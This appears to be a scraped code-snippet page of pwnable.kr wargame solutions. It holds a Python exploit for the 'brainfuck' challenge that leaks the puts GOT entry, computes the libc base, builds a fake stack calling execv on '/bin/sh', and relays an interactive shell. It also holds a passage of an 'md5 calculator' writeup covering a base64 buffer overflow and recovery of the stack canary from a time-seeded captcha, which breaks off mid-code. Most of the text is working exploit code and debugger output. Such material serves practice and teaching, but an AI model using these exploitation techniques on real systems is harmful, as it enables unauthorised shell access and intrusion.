alt1"><code class="python plain">got_puts </code><code class="python keyword">=</code> <code class="python value">0x0804A018</code></div><div class="line number13 index12 alt2"><code class="python plain">tape </code><code class="python keyword">=</code> <code class="python value">0x0804A0A0</code></div><div class="line number14 index13 alt1"><code class="python plain">gadget_leave_ret </code><code class="python keyword">=</code> <code class="python value">0x8048549</code></div><div class="line number15 index14 alt2"><code class="python plain">gadget_pop_ret </code><code class="python keyword">=</code> <code class="python value">0x804866f</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">b''</code></div><div class="line number18 index17 alt1"><code class="python keyword">while</code> <code class="python plain">data.count(b</code><code class="python string">'\n'</code><code class="python plain">) &lt; </code><code class="python value">2</code><code class="python plain">:</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">proc.stdout.read(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number20 index19 alt1">&nbsp;</div><div class="line number21 index20 alt2"><code class="python keyword">print</code><code class="python plain">(data.decode())</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python plain">fake_stack </code><code class="python keyword">=</code> <code class="python plain">bytearray(\</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">b</code><code class="python string">'XXXX'</code> <code class="python keyword">+</code><code class="python plain">\</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">b</code><code class="python string">'XXXX'</code> <code class="python keyword">+</code><code class="python plain">\</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, tape</code><code class="python keyword">+</code><code class="python value">16</code><code class="python plain">) </code><code class="python keyword">+</code><code class="python plain">\</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, tape</code><code class="python keyword">+</code><code class="python value">24</code><code class="python plain">) </code><code class="python keyword">+</code><code class="python plain">\</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">b</code><code class="python string">"/bin/sh\x00"</code> <code class="python keyword">+</code><code class="python plain">\</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, tape</code><code class="python keyword">+</code><code class="python value">16</code><code class="python plain">)\</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">) </code></div><div class="line number31 index30 alt2">&nbsp;</div><div class="line number32 index31 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'AAAA'</code> <code class="python keyword">*</code> <code class="python value">3</code> <code class="python comments"># padding</code></div><div class="line number33 index32 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, gadget_pop_ret) </code><code class="python comments"># for fake stack</code></div><div class="line number34 index33 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, tape</code><code class="python keyword">-</code><code class="python value">4</code><code class="python plain">) </code><code class="python comments"># esp of fake stack = tape</code></div><div class="line number35 index34 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, gadget_leave_ret) </code><code class="python comments"># for fake stack</code></div><div class="line number36 index35 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'&lt;'</code><code class="python keyword">*</code><code class="python plain">(tape</code><code class="python keyword">-</code><code class="python plain">got_puts) </code><code class="python keyword">+</code> <code class="python plain">b</code><code class="python string">'.&gt;.&gt;.&gt;.&gt;'</code> <code class="python comments"># print address of func puts</code></div><div class="line number37 index36 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'&lt;'</code><code class="python keyword">*</code><code class="python value">4</code> <code class="python keyword">+</code> <code class="python plain">b</code><code class="python string">',&gt;'</code><code class="python keyword">*</code><code class="python value">4</code> <code class="python comments"># puts got overwrite</code></div><div class="line number38 index37 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'&lt;'</code><code class="python keyword">*</code><code class="python value">4</code> <code class="python comments"># set pointer to puts</code></div><div class="line number39 index38 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'&gt;'</code><code class="python keyword">*</code><code class="python plain">(tape</code><code class="python keyword">-</code><code class="python plain">got_puts) </code><code class="python comments"># set pointer to tape</code></div><div class="line number40 index39 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">',&gt;'</code><code class="python keyword">*</code><code class="python functions">len</code><code class="python plain">(fake_stack) </code><code class="python comments"># overwrite payload with PAYLOAD</code></div><div class="line number41 index40 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">b</code><code class="python string">'['</code> <code class="python comments"># execute puts</code></div><div class="line number42 index41 alt1"><code class="python functions">print</code><code class="python plain">(payload)</code></div><div class="line number43 index42 alt2">&nbsp;</div><div class="line number44 index43 alt1"><code class="python plain">proc.stdin.write(payload </code><code class="python keyword">+</code> <code class="python plain">b</code><code class="python string">'\n'</code><code class="python plain">)</code></div><div class="line number45 index44 alt2"><code class="python plain">proc.stdin.flush()</code></div><div class="line number46 index45 alt1">&nbsp;</div><div class="line number47 index46 alt2"><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">b''</code></div><div class="line number48 index47 alt1"><code class="python plain">data </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">proc.stdout.read(</code><code class="python value">4</code><code class="python plain">)</code></div><div class="line number49 index48 alt2"><code class="python plain">puts </code><code class="python keyword">=</code> <code class="python plain">struct.unpack(</code><code class="python string">'&lt;L'</code><code class="python plain">, data)[</code><code class="python value">0</code><code class="python plain">]</code></div><div class="line number50 index49 alt1">&nbsp;</div><div class="line number51 index50 alt2"><code class="python functions">print</code><code class="python plain">(</code><code class="python string">"puts"</code><code class="python plain">, </code><code class="python functions">hex</code><code class="python plain">(puts))</code></div><div class="line number52 index51 alt1">&nbsp;</div><div class="line number53 index52 alt2"><code class="python plain">lib_system </code><code class="python keyword">=</code> <code class="python value">0x3ada0</code></div><div class="line number54 index53 alt1"><code class="python plain">lib_puts </code><code class="python keyword">=</code> <code class="python value">0x5fca0</code> <code class="python keyword">if</code> <code class="python plain">LOCAL </code><code class="python keyword">else</code> <code class="python value">0x5f020</code></div><div class="line number55 index54 alt2"><code class="python plain">lib_execv </code><code class="python keyword">=</code> <code class="python value">0xb0780</code> <code class="python keyword">if</code> <code class="python plain">LOCAL </code><code class="python keyword">else</code> <code class="python value">0xaf580</code></div><div class="line number56 index55 alt1"><code class="python plain">gadget_add_esp </code><code class="python keyword">=</code> <code class="python value">0xabce5</code> <code class="python keyword">if</code> <code class="python plain">LOCAL </code><code class="python keyword">else</code> <code class="python value">0xaad35</code></div><div class="line number57 index56 alt2">&nbsp;</div><div class="line number58 index57 alt1"><code class="python plain">base </code><code class="python keyword">=</code> <code class="python plain">puts </code><code class="python keyword">-</code> <code class="python plain">lib_puts</code></div><div class="line number59 index58 alt2"><code class="python plain">execv </code><code class="python keyword">=</code> <code class="python plain">base </code><code class="python keyword">+</code> <code class="python plain">lib_execv</code></div><div class="line number60 index59 alt1"><code class="python functions">print</code><code class="python plain">(</code><code class="python string">"execv"</code><code class="python plain">, </code><code class="python functions">hex</code><code class="python plain">(execv))</code></div><div class="line number61 index60 alt2"><code class="python plain">execv </code><code class="python keyword">=</code> <code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, execv)</code></div><div class="line number62 index61 alt1">&nbsp;</div><div class="line number63 index62 alt2"><code class="python plain">fake_stack[</code><code class="python value">0</code><code class="python plain">:</code><code class="python value">4</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python plain">execv</code></div><div class="line number64 index63 alt1">&nbsp;</div><div class="line number65 index64 alt2"><code class="python plain">move_esp </code><code class="python keyword">=</code> <code class="python plain">struct.pack(</code><code class="python string">'&lt;L'</code><code class="python plain">, base </code><code class="python keyword">+</code> <code class="python plain">gadget_add_esp)</code></div><div class="line number66 index65 alt1">&nbsp;</div><div class="line number67 index66 alt2"><code class="python plain">proc.stdin.write(move_esp </code><code class="python keyword">+</code> <code class="python plain">fake_stack </code><code class="python keyword">+</code> <code class="python plain">b</code><code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number68 index67 alt1"><code class="python plain">proc.stdin.flush()</code></div><div class="line number69 index68 alt2">&nbsp;</div><div class="line number70 index69 alt1"><code class="python keyword">def</code> <code class="python plain">thread_input():</code></div><div class="line number71 index70 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x </code><code class="python keyword">=</code> <code class="python functions">input</code><code class="python plain">()</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc.stdin.write(x.encode() </code><code class="python keyword">+</code> <code class="python plain">b</code><code class="python string">'\n'</code><code class="python plain">)</code></div><div class="line number74 index73 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc.stdin.flush()</code></div><div class="line number75 index74 alt2"><code class="python plain">threading.Thread(target</code><code class="python keyword">=</code><code class="python plain">thread_input).start()</code></div><div class="line number76 index75 alt1">&nbsp;</div><div class="line number77 index76 alt2"><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">b''</code></div><div class="line number78 index77 alt1"><code class="python keyword">while</code> <code class="python color1">True</code> <code class="python plain">:</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">proc.stdout.read(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python keyword">not</code> <code class="python plain">data:</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code><code class="python plain">(data.decode(), end</code><code class="python keyword">=</code><code class="python plain">"")</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
pwnable.kr brainfuck solution
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Changochen">Changochen</a>/<a href="https://pythonexample.com/snippet/python/readmemd_changochen_python">README.MD</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_213099" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># Pwnable.kr md5 calculator writeup</code></div><div class="line number2 index1 alt1"><code class="python plain">ihciah@gmail.com</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">In `process_hash`, the size of </code><code class="python functions">input</code> <code class="python keyword">is</code> <code class="python plain">`</code><code class="python value">1024</code><code class="python plain">`, the size after `b64d` </code><code class="python keyword">is</code> <code class="python value">512</code><code class="python plain">, however, it should be `</code><code class="python value">1024</code><code class="python keyword">*</code><code class="python value">3</code><code class="python keyword">/</code><code class="python value">4</code><code class="python plain">`, so there's a </code><code class="python functions">buffer</code> <code class="python plain">overflow here.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">Because of the stack canary, we can do nothing. I was confused here until I noticed the canary </code><code class="python keyword">is</code> <code class="python plain">also used </code><code class="python keyword">in</code> <code class="python plain">`my_hash` to generate random number. Since the canary </code><code class="python keyword">is</code> <code class="python plain">`gs:</code><code class="python value">0x14</code><code class="python plain">`, it's always the same </code><code class="python keyword">in</code> <code class="python functions">all</code> <code class="python plain">function calls.</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">We can calculate the canary value </code><code class="python keyword">from</code> <code class="python plain">the `captcha` because the seed of randomization </code><code class="python keyword">is</code> <code class="python plain">the current time, we can fetch it </code><code class="python keyword">from</code> <code class="python plain">http request to `http:</code><code class="python keyword">/</code><code class="python keyword">/</code><code class="python plain">pwnable.kr`.</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python plain">After trying </code><code class="python functions">input</code> <code class="python plain">`b64e(</code><code class="python string">"AAAA"</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">768</code><code class="python keyword">/</code><code class="python value">4</code><code class="python plain">))` to the program, jump to </code><code class="python keyword">pass</code> <code class="python plain">the canary check </code><code class="python keyword">and</code> <code class="python keyword">break</code> <code class="python plain">at `ret`, we can notice that the top of stack </code><code class="python keyword">is</code> <code class="python plain">`AAAA...`.</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">Again we </code><code class="python functions">input</code> <code class="python plain">`b64e(string.ascii_uppercase[:</code><code class="python value">24</code><code class="python plain">]</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">768</code><code class="python keyword">/</code><code class="python value">24</code><code class="python plain">))`, we can see:</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python plain">```</code></div><div class="line number15 index14 alt2"><code class="python plain">[</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">code</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">]</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908b</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">249</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; ebx</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908c</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">250</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; edi</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908d</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">251</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; ebp</code></div><div class="line number19 index18 alt2"><code class="python keyword">=</code><code class="python plain">&gt; </code><code class="python value">0x804908e</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">252</code><code class="python plain">&gt;:&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp; </code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908f</code> <code class="python plain">&lt;main&gt;:&nbsp; push&nbsp;&nbsp; ebp</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049090</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">1</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; ebp,esp</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049092</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">3</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; </code><code class="python keyword">and</code>&nbsp;&nbsp;&nbsp; <code class="python plain">esp,</code><code class="python value">0xfffffff0</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049095</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">6</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp; esp,</code><code class="python value">0x20</code></div><div class="line number24 index23 alt1"><code class="python plain">[</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">stack</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">]</code></div><div class="line number25 index24 alt2"><code class="python value">0000</code><code class="python plain">| </code><code class="python value">0xffffdb8c</code> <code class="python plain">(</code><code class="python string">"ABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGH"</code><code class="python plain">...)</code></div><div class="line number26 index25 alt1"><code class="python value">0004</code><code class="python plain">| </code><code class="python value">0xffffdb90</code> <code class="python plain">(</code><code class="python string">"EFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKL"</code><code class="python plain">...)</code></div><div class="line number27 index26 alt2"><code class="python value">0008</code><code class="python plain">| </code><code class="python value">0xffffdb94</code> <code class="python plain">(</code><code class="python string">"IJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOP"</code><code class="python plain">...)</code></div><div class="line number28 index27 alt1"><code class="python value">0012</code><code class="python plain">| </code><code class="python value">0xffffdb98</code> <code class="python plain">(</code><code class="python string">"MNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRST"</code><code class="python plain">...)</code></div><div class="line number29 index28 alt2"><code class="python value">0016</code><code class="python plain">| </code><code class="python value">0xffffdb9c</code> <code class="python plain">(</code><code class="python string">"QRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWX"</code><code class="python plain">...)</code></div><div class="line number30 index29 alt1"><code class="python value">0020</code><code class="python plain">| </code><code class="python value">0xffffdba0</code> <code class="python plain">(</code><code class="python string">"UVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCD"</code><code class="python plain">...)</code></div><div class="line number31 index30 alt2"><code class="python value">0024</code><code class="python plain">| </code><code class="python value">0xffffdba4</code> <code class="python plain">(</code><code class="python string">"ABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGH"</code><code class="python plain">...)</code></div><div class="line number32 index31 alt1"><code class="python plain">```</code></div><div class="line number33 index32 alt2"><code class="python plain">Just </code><code class="python keyword">return</code> <code class="python plain">to `</code><code class="python value">0x08049187</code><code class="python plain">` to do `system` with parameter </code><code class="python keyword">in</code> <code class="python plain">stack.</code></div><div class="line number34 index33 alt1">&nbsp;</div><div class="line number35 index34 alt2"><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="python plain">Break at the stack check </code><code class="python keyword">and</code> <code class="python plain">run the program. The time now </code><code class="python keyword">is</code> <code class="python plain">`</code><code class="python value">1454513017</code><code class="python plain">`, </code><code class="python keyword">and</code> <code class="python plain">the captcha </code><code class="python keyword">is</code> <code class="python plain">`</code><code class="python keyword">-</code><code class="python value">2091140111</code><code class="python plain">`. Feed these two data into a small program which </code><code class="python keyword">is</code> <code class="python plain">used to calculate stack cookie. And we get output `</code><code class="python value">8a120200</code><code class="python plain">`, just as the same as what we </code><code class="python keyword">print</code> <code class="python keyword">in</code> <code class="python plain">gdb.</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="python plain">```</code></div><div class="line number40 index39 alt1"><code class="python comments">#include &lt;assert.h&gt;</code></div><div class="line number41 index40 alt2"><code class="python comments">#include &lt;stdlib.h&gt;</code></div><div class="line number42 index41 alt1"><code class="python comments">#include &lt;stdio.h&gt;</code></div><div class="line number43 index42 alt2"><code class="python functions">int</code> <code class="python plain">main(</code><code class="python functions">int</code> <code class="python plain">argc, char </code><code class="python keyword">*</code><code class="python keyword">*</code><code class="python plain">argv){</code></div><div 